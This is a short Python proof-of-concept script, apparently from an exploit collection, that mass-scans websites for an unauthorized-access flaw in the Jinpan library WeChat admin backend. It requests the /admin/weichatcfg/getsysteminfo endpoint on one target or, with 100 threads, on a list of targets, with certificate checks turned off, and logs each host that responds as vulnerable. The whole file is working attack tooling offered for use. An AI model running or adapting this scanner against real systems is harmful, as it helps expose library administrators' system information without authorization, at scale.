import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
       ___       ____            
      / (_)___  / __ \____ _____ 
 __  / / / __ \/ /_/ / __ `/ __ \
/ /_/ / / / / / ____/ /_/ / / / /
\____/_/_/ /_/_/    \__,_/_/ /_/ 
                                 
"""
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/admin/weichatcfg/getsysteminfo"
    try:
        res = requests.get(url=target+payload,verify=False)
        if res.status_code==200 and 'id' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()